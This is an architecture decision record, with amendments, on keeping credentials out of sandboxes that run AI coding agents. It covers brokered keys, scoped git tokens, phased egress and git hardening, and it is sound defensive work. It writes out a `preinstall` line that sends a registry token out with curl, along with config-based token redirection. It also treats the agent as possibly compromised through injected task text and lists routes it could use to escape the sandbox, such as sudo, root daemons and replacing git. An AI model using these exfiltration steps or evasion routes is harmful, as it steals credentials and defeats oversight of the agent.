# ADR-0014: Sandbox secrets — brokered model keys, per-role scoped git tokens, phase-based egress

- Status: Accepted; amended by ADR-0028 (proposed), ADR-0029 (proposed), ADR-0031
- Date: 2026-08-18

## Context

Plan §19 requires minimal secret injection, short-lived credentials, and an explicit maker/verifier trust boundary, but the concrete credential inventory only became fixed once the surrounding decisions landed: GitHub App installation tokens (ADR-0009), the maker's OpenAI key for Codex (ADR-0006/0010), the checker's Anthropic key (ADR-0010), and Supabase connection strings plus Storage S3 keys (ADR-0008).

## Decision

**No model key ever enters a sandbox; git credentials are per-role scoped installation tokens; egress narrows when the agent starts running.**

- §1 — The maker's model key is brokered, never injected.
- §2 — Git credentials are per-role scoped installation tokens.
- §3 — Egress narrows in two phases.
- §4 — What a leaked sandbox reaches, stated plainly.

## Consequences

- The strongest available posture on Vercel Sandbox, and the residual risk is time-boxed and spend-capped rather than open-ended.
- `SandboxProvider` gains two obligations beyond exec/files: credential brokering and phased network policy.
- Per-role token minting means the control plane calls GitHub's installation-token endpoint per workspace rather than caching one token per run — more API calls, and re-minting is a case the long-run path must handle.
- Phase transitions add a failure mode: a policy update that lands late would let the agent start with install-phase egress.

**Later changes** (full text in Background):

- Amendment, 2026-09-23 — this ADR names milestones instead of numbering them
- Amendment, 2026-09-24 — §5: repository secrets enter the install phase, and §4's table changes
- Amendment, 2026-10-16 — the maker is the attacker: candidate installs, the write token, and the PR pin

## Background

The original record, verbatim except for heading levels. Section numbers (§n) cited from code resolve here.

- Status: Accepted
- Date: 2026-08-18
- Resolves: [#79 — Decide secret injection and credential scoping for sandboxes](https://github.com/jyothepro/orqon/issues/79) (wayfinder map [#50](https://github.com/jyothepro/orqon/issues/50))

> Amended by [ADR-0029](0029-windkeel-is-an-integrated-coding-assistant-and-the-verifier-stays-the-gate.md) (Proposed), §3: exposed ports exist only in a human workspace (a separate sandbox seeded through git, never the maker's), behind a per-session capability token; its network policy is the install allowlist, and no push token ever enters it: the commit leaves as a git bundle and the API host pushes it (amended after Spike B, #368).

### Context

Plan §19 requires minimal secret injection, short-lived credentials, and an explicit maker/verifier trust boundary, but the concrete credential inventory only became fixed once the surrounding decisions landed: GitHub App installation tokens (ADR-0009), the maker's OpenAI key for Codex (ADR-0006/0010), the checker's Anthropic key (ADR-0010), and Supabase connection strings plus Storage S3 keys (ADR-0008). ADR-0002 puts all of them in the worker container's environment; the question this ticket asks is which of them cross into a sandbox, in what form, and what a compromised sandbox reaches.

Two facts narrow the problem sharply.

**The checker's key never needs to enter a sandbox.** The verification engine runs host-side in the worker container and reaches into the workspace through `ExecutionEnvironment`; only workspace *commands* run in the sandbox. Review and mapping model calls are made by the engine process itself, so the Anthropic key stays in the worker container by construction — ADR-0004's "checker credentials never enter the maker sandbox" turns out to understate it. Likewise the Supabase credentials: the evidence package is the verifier's own product, written host-side, so no sandbox ever needs storage or database access.

**That leaves exactly two credential classes crossing the boundary**: the maker's OpenAI key (Codex runs *inside* the maker sandbox, so something must authenticate) and git credentials (both sandboxes clone; the maker also pushes).

What runs in those sandboxes is untrusted in both roles: the maker executes model-generated commands, and the verifier executes the repository's own test and build code from the candidate commit. Neither is a trusted context. Vercel Sandbox offers per-domain `transform` rules that inject headers at the egress proxy ([vercel-sandbox findings](../../research/vercel-sandbox/findings.md) §3), plus live `networkPolicy` updates — with a documented warning that subnet/domain rule composition has bypass sharp edges a policy layer must not misuse.

### Decision

**No model key ever enters a sandbox; git credentials are per-role scoped installation tokens; egress narrows when the agent starts running.**

#### 1. The maker's model key is brokered, never injected

The maker sandbox runs Codex with a placeholder `CODEX_API_KEY`; the real key is attached by the provider's egress proxy as an `Authorization` header on requests to the model API domain. The key exists only in the worker container and the proxy configuration.

Worst case for a fully compromised maker sandbox: it can spend model tokens through the proxy for as long as the sandbox lives — bounded by ADR-0011's spend rail and the run's wall-clock cap — but it cannot exfiltrate a reusable credential. That is a materially better failure than "the key is in the environment of a VM running model-authored shell commands as root".

**Provider-interface consequence:** brokering is provider-specific, so the Milestone 2 `SandboxProvider` must express "attach this credential to egress for this domain" as a first-class capability rather than assuming env-var injection. A provider that cannot broker must declare that, and using it is then an explicit, recorded downgrade — not a silent fallback.

#### 2. Git credentials are per-role scoped installation tokens

A fresh GitHub App installation token is minted per workspace, scoped to the single repository with the narrowest permission set the role needs:

| Workspace role | Permissions | Why |
|---|---|---|
| maker | `contents: write` | must push its working branch |
| verifier | `contents: read` | clones and fetches candidate commits; must never be able to write |

The verifier's inability to push is enforced by the credential itself, not by convention — a compromised verifier cannot forge the artifact it is judging, which is precisely the property ADR-0004 exists to guarantee. Tokens expire hourly; the control plane re-mints when a run outlives one. Tokens are minted per workspace, so revoking or expiring one never affects another run.

#### 3. Egress narrows in two phases

The sandbox's network policy is updated live at the phase boundary:

- **Install phase** — package registries and `github.com` reachable, so dependency installation and cloning work.
- **Execution phase** — narrowed to the brokered model API domain; registry and general egress dropped before any model-generated or repository-provided command runs.

This bounds exfiltration exactly when untrusted code executes, which is the window that matters. Per the findings' warning, the policy layer composes domain rules only in the documented-safe way, and Windkeel treats any exposed port as internet-reachable.

#### 4. What a leaked sandbox reaches, stated plainly

| Credential | In maker sandbox | In verifier sandbox |
|---|---|---|
| Maker OpenAI key | No — brokered at proxy | No |
| Checker Anthropic key | No | **No** — engine calls it host-side |
| Supabase DB / Storage keys | No | No |
| Git token | Yes — repo-scoped, `contents: write`, ~1h | Yes — repo-scoped, `contents: read`, ~1h |

The complete worst case for a fully compromised sandbox: push to one repository (maker only), spend model tokens through the proxy until the rails stop the run, and read the candidate source it was already given. It cannot reach the database, the evidence store, another run's workspace, or any credential that outlives the sandbox.

### Consequences

- The strongest available posture on Vercel Sandbox, and the residual risk is time-boxed and spend-capped rather than open-ended.
- `SandboxProvider` gains two obligations beyond exec/files: credential brokering and phased network policy. Both are Milestone 2 interface work, and both must be expressible-or-refusable so a future Cloudflare provider is honest about what it supports.
- Per-role token minting means the control plane calls GitHub's installation-token endpoint per workspace rather than caching one token per run — more API calls, and re-minting is a case the long-run path must handle.
- Phase transitions add a failure mode: a policy update that lands late would let the agent start with install-phase egress. The phase change must therefore be a precondition of starting the agent, not a concurrent action.
- ADR-0004's credential-separation claim becomes auditable from data: `Workspace.role` determines the token scope, so "the verifier could not have pushed" is checkable per run rather than asserted.
- Nothing here depends on BYOK; when the BYOK milestone introduces customer keys, brokering is the mechanism that keeps a customer's key out of sandboxes too.

### Amendment, 2026-09-23 — this ADR names milestones instead of numbering them

The roadmap's M7–M15 were reordered (`research/MILESTONES.md`, *The 2026-09-23 reordering*). No
decision here changes: the deliverables moved position, not content. Every milestone *number* in
this record was replaced with the milestone's *name*, because a number written into a decision
record becomes wrong the first time the roadmap resequences, and a wrong number is worse than no
number. The mapping table in `MILESTONES.md` decodes the old numbers still visible in git history.

BYOK is now **M9**; the Cloudflare provider is now **M15**.

### Amendment, 2026-09-24 — §5: repository secrets enter the install phase, and §4's table changes

ADR-0023 §9 recorded that brokering the model key and the git token "means a repository needing a
private registry credential cannot be built at all". That was exact, and worse than it sounds: the
install did not merely lack a credential, it *failed*, and then the verifier ran the repository's own
declared checks against a tree with no packages. The verdict that comes out of that is about the
factory, not about the candidate — the same wrong answer `src/sandbox/dependencies.ts` exists to
prevent, arriving through a different door.

#### 5. Repository secrets are injected into the install command's environment, and nowhere else

An operator stores a secret per repository (ADR-0023 §9). The worker opens it and merges it into the
environment of the dependency install — `npm ci`, `pip install`, `go mod download` — in **both**
sandboxes, maker and verifier. It is not added to `runInExecutionPhase`'s environment, so no
model-generated command and no repository check runs with it set.

**This is a real weakening of §1's posture and it is stated rather than buried.** §1's guarantee is
that no model key is ever *in* a sandbox, because it can be brokered at the egress proxy instead.
Brokering cannot carry a registry credential: the credential's form is the registry's business — a
`.npmrc` line, a bearer token, HTTP basic auth, a `GOPROXY` URL with credentials in it — and there is
no header this factory can attach that covers them. So the value goes into an environment, and the
question becomes how narrowly.

Three things narrow it, and one does not:

- **One command.** The value is present for the install and for nothing else in the sandbox's life.
- **A fixed argv.** The install command is derived from a lockfile, not chosen by the agent.
- **A refusal list.** `assertSecretKey` refuses names that would shadow a brokered credential
  (`CODEX_API_KEY`, `OPENAI_API_KEY`, …) or redirect an interpreter (`PATH`, `NODE_OPTIONS`,
  `LD_PRELOAD`, …), so a secret cannot be used to put a real model key into a sandbox or to replace
  the binary the install names.
- **What does not narrow it: package lifecycle scripts.** `npm ci` runs the repository's own
  `postinstall`, and `pip install` runs its `setup.py`. That is repository-provided code executing
  with the credential in its environment, and it is unavoidable — a resolver that cannot authenticate
  cannot resolve. A repository whose dependencies are hostile could exfiltrate its own registry
  token, which is a materially smaller problem than the same repository being able to exfiltrate the
  model key, and is why the two are handled differently.


#### Two alternatives, considered and declined on 2026-09-24

**`--ignore-scripts` when a secret is present.** It would keep the credential away from repository code
by letting only the resolver see it. Declined for two reasons, the second worse than the first: many
repositories genuinely need install-time scripts (native builds, code generation), so this would
refuse to build them; and it would refuse to build them *only when a secret was configured*, which is
a coupling whose failure surfaces two layers from its cause. A per-repository flag was declined in
turn — nobody sets a knob like that until something has already broken.

**Per-role secrets, with the verifier getting a narrower set.** Declined because the verifier runs the
repository's *own* declared checks, which need the repository's dependencies installed. Starving it
returns us to verdicts about the factory rather than about the candidate, which is the failure this
capability exists to remove. Both roles get the same set.

#### §3 is amended: the install-phase allowlist is derived from the repository

§3 described this phase as "package registries and `github.com` reachable", and the implementation was
a fixed list of eighteen hosts. That was defensible while nothing in the phase held a credential. §5
puts one there, and a fixed list then means a JavaScript repository's `postinstall` runs with a token
*and* egress to Go's module proxy, Python's package index and six Linux distribution archives — none
of which its install will ever touch.

The list is now derived: the ecosystems the checkout actually declares (by the same marker rules the
install uses), the system-tool and scanner hosts only when those installs will run, and the hosts the
repository's own secrets name.

**That last clause is not hardening — it is what makes §5 work.** The first version of repository
secrets shipped without it and was inert for its primary case: a secret setting `npm_config_registry`
to an internal host was injected correctly and the fetch was then refused by this very allowlist,
presenting as a connection error inside a package manager with nothing anywhere pointing at egress.
Only values that parse as `http`/`https` URLs contribute a host, which means a bare `NPM_TOKEN`
alongside an `.npmrc` committed in the repository names nothing and that registry stays unreachable;
the fix is to set the URL as a secret as well.

**What this does not close.** `github.com` stays, unconditionally — the phase needs it for submodules
and for dependencies given as a repository URL — and it is reachable by a hostile `postinstall`
holding a token, because an attacker who controls a dependency controls a repository they can push to.
That exfiltration path is open and this narrowing does not shut it. The only thing that would is not
running lifecycle scripts, declined above. Said plainly here because a partial mitigation mistaken for
a complete one is worse than none.

#### §4's table, corrected

| Credential | In maker sandbox | In verifier sandbox |
|---|---|---|
| Maker OpenAI key | No — brokered at proxy | No |
| Checker Anthropic key | No | **No** — engine calls it host-side |
| Supabase DB / Storage keys | No | No |
| Git token | Yes — repo-scoped, `contents: write`, ~1h | Yes — repo-scoped, `contents: read`, ~1h |
| **Repository secrets** | **Yes — install phase only** | **Yes — install phase only** |

The complete worst case for a fully compromised sandbox gains one clause: it can also read whatever
credentials that repository's own install needs, if it compromises the sandbox during the install
phase. It still cannot reach the database, the evidence store, another run's workspace, another
repository's secrets, or any model key.

#### The key pair, and why it is a pair

The stored value is sealed with X25519 + HKDF + AES-256-GCM (`src/factory/secret-box.ts`). Ingress
holds the **public** half and the **stage deployment** holds the **private** half, which puts ADR-0023
§9's "no field for the value" beyond the reach of a future edit: the process that accepts a secret is
cryptographically unable to open one, and a dump of `repository_secret` is unreadable without a key
that was never in the database. A symmetric key would have been simpler and would have put every
repository's credential within reach of the hop that faces the internet.

("Stage deployment" is this record's older "worker container", which ADR-0020 removed. The
environment moved; the split between the two halves did not change, and is the whole point.)

A rotation of the pair does not re-seal what is stored. Every existing secret becomes unopenable,
`windkeel doctor` fails naming each one, and the install's own detail says which names were not injected
— because the alternative is a registry 401 whose message never mentions a secret.

### Amendment, 2026-10-16 — the maker is the attacker: candidate installs, the write token, and the PR pin

Everything above treats "the repository's own code" as one thing. It is two. The **base** tree
(the default branch, which the maker installs) is the repository's; the **candidate** tree (what
the verifier installs, and what the capture commits from) is the maker's — and the maker is driven
by task text that anyone who can file an issue, send a Slack command or edit a Linear ticket can
write. The threat model this amendment adopts: **assume the maker is fully compromised, and the
candidate tree and the maker's `.git/` are hostile.** Under it, three holes were open.

#### §5 is amended: a candidate tree's lifecycle scripts never run with the secrets

§5 declined `--ignore-scripts` because "many repositories genuinely need install-time scripts".
That was weighed against a hostile *dependency*. A hostile *candidate* is cheaper: one line of
`package.json` — `"preinstall": "curl -d $NPM_TOKEN …"`, or simply `echo $NPM_TOKEN >&2; exit 1`,
which needed no egress at all because the install's stderr tail was copied into
`verification_run.risk_summary` and rendered in the console. So, for a candidate tree only
(`InstallOptions.candidateTree`, set by VERIFYING):

- **npm, pnpm:** the resolving install runs with `--ignore-scripts` and is the only command holding
  the secrets; the skipped scripts then run as a second command (`npm rebuild`, `pnpm rebuild`)
  with **no secrets** in its environment. Native addons still build; nothing that runs holds a
  credential. (`npm rebuild` runs the root project's install scripts as well as dependencies'.)
- **Yarn:** scripts off, and no second step — classic Yarn cannot run them apart from a resolve.
  The detail says so; a repository that needs them will see its checks fail honestly.
- **pip, Poetry, uv:** cannot be separated. Building an sdist, a VCS requirement or the project
  itself runs a build backend, which is repository code. The install runs as before and its detail
  states that candidate code ran with the secrets present. This is the residual, said plainly;
  the options for closing it (withholding secrets from a verifier's Python install,
  `--only-binary :all:`, installing only when the lockfile is unchanged from the base) each break
  something real and are left as a follow-up rather than chosen silently.
- **The maker's install is unchanged**: it installs the default branch, which is §5's case.

The repository setting §5 rejected is still not added; nothing here needs it.

**Redaction is the floor under every install detail** (`src/sandbox/redact.ts`): text produced by
a command that held secrets is redacted against them — raw, URL-encoded, base64 at all three
alignments in both alphabets — before it becomes a detail string, and the whole `DependencyInstall`
record is redacted again where it leaves `provisionWorkspace`. It does not catch an arbitrary
transformation (a value reversed or split), which is why it is the floor and not the defence.

#### §2 is amended: the write token exists in the maker's sandbox only for the push

§4's table said the maker's token is in the sandbox "repo-scoped, `contents: write`, ~1h". It was
also *readable by the agent for that hour*: written at provisioning to a file owned by the same
user Codex runs as (`--sandbox danger-full-access`), and named as the global credential helper.
And the push ran the agent's own `.git/hooks/pre-push`, honoured its `core.hooksPath`,
`credential.helper`, `core.fsmonitor` and `filter.*.clean`, with egress to the git host open. Now:

1. **Not installed at provisioning**, for either role. The clone is done by then, execution-phase
   egress does not reach the git host, and the verifier never fetches. A clone credential the
   platform may have left in `.git/config` (URL userinfo, an `extraheader`) is scrubbed right after
   `create()`, before any repository code runs.
2. **The capture quiesces the sandbox** (`SandboxHandle.terminateStrayProcesses`) before it reads
   any git config and again immediately before the token exists: every process of the sandbox's
   default user other than the sweep's own ancestry is stopped (`SIGSTOP`, then `SIGKILL`, in
   passes until one finds nothing). With a token to install, a sweep that cannot confirm this
   fails the capture. `FakeSandboxProvider` answers "cannot, and there is no sandbox to protect"
   (`noSandbox`) — its commands run on the developer's machine, as the developer — and the capture
   proceeds on that answer and on no other unconfirmed one.
3. **Git runs hardened** (`src/sandbox/git-hardening.ts`): hooks at `/dev/null`, `fsmonitor` off,
   every credential helper reset, signing off, system and global config unread, transports other
   than `https`/`file` refused. What `-c` cannot neutralize — filters, `include.path`, `url.*`
   rewrites, `remote.*.pushurl` — is refused: `.git/config` is held to an **allowlist** of the keys
   a clone and a commit produce, and a redirected `.git` (gitdir file, `commondir`) is refused, both
   failing the capture closed.
4. **The token is installed just in time**, named to the one `git push` with
   `-c credential.helper=store --file …`, pushed to the workspace row's repository URL rather than
   `origin`, and **removed in a `finally`** — the maker's sandbox outlives the capture (ADR-0017),
   and the next repair turn finds no token and narrowed egress.

**What this does not close: root.** The image's default user has passwordless `sudo`. An agent that
uses it can start a root daemon the unprivileged sweep cannot see as its own, or replace
`/usr/bin/git` before the push; no argument to that binary helps. The sweep deliberately does not
escalate to kill root processes: without a baseline it cannot tell the agent's from the
platform's exec daemon. The real fix is the one ADR-0004 already names — the candidate leaves the
maker sandbox as a `git bundle` read through the file API, and the push happens from the stage
host, so the token never enters the sandbox at all. Running the agent as a separate,
sudo-less user (`Sandbox.createUser`) is the cheaper half-step. Both are follow-ups; the sweep and
the hardening are what this change could ship and validate without a live sandbox.

#### PR_CREATING pins the branch to the verified SHA

The PR was opened (or adopted) from a branch *name*, and nothing checked the name still held the
commit verification judged. The maker's token is repository-scoped, not branch-scoped, and lives
its hour wherever it ended up. PR_CREATING now reads the branch's head from GitHub
(`GitHubClient.getBranchHead`) before opening or adopting, holds an adopted PR's head to the same
rule, and checks the head GitHub reports for a PR it just opened. A mismatch, or a branch that does
not exist, is `FAILED` with both SHAs in the reason — not `BLOCKED`, because no human decision
makes old evidence describe a new commit; the remedy is a new run.

**Not done here:** a push to the PR *after* it opens (`pull_request.synchronize`) is not yet marked
stale. The check run is attached to the verified SHA, so GitHub already shows the new head as having
no `windkeel/verification` result, but the sticky comment does not say so. Follow-up.

#### §4's table, corrected again

| Credential | In maker sandbox | In verifier sandbox |
|---|---|---|
| Git token | **Only for the capture's push**, after a process sweep; removed after | **No** — used for the clone by the provider, then scrubbed |
| Repository secrets | Install phase only (base tree, scripts on) | Install phase only — resolver only for npm/pnpm/Yarn; build backends for Python |

#### Review follow-up (same date): what the secret-bearing install *reads*, and failing closed

Turning scripts off is not enough on its own, because the resolver still reads candidate-controlled
configuration while it holds the secrets: `.npmrc` can point the registry at a host of the
candidate's choosing with `//host/:_authToken=${NPM_TOKEN}`; `.pnpmfile.cjs` is code pnpm loads
regardless of `--ignore-scripts`; `.yarnrc.yml`'s `yarnPath` replaces the yarn binary;
`.yarn/plugins` load as code; `packageManager` steers Corepack. So a candidate install now holds the
secrets **only if its install configuration is identical to the repository's own** (the parent of
the run's first candidate) — any change to those files or to the `packageManager` pin, or a base
that cannot be compared, and the install runs without secrets and says so. pnpm additionally gets
`--ignore-pnpmfile`, because an unchanged pnpmfile can still `require()` a file the candidate edited.
Residual: unchanged base configuration that *references* an in-tree file the candidate edited (an
`.npmrc` `globalconfig=./x`, a `yarnPath` outside `.yarn/releases`) is not followed.

The token's removal after the push and the clone-credential scrub at provisioning now check every
exit status and verify their result — the scrub ends by searching all of `.git` for the token —
and fail closed: a capture that cannot confirm the token is gone throws, which releases the maker
sandbox; a scrub that cannot confirm fails provisioning. Remotes whose *name* contains `:`, `/` or
`\` (in config, or as legacy `.git/remotes`/`.git/branches` files) are refused, because git resolves
a push target as a remote name before treating it as a URL.
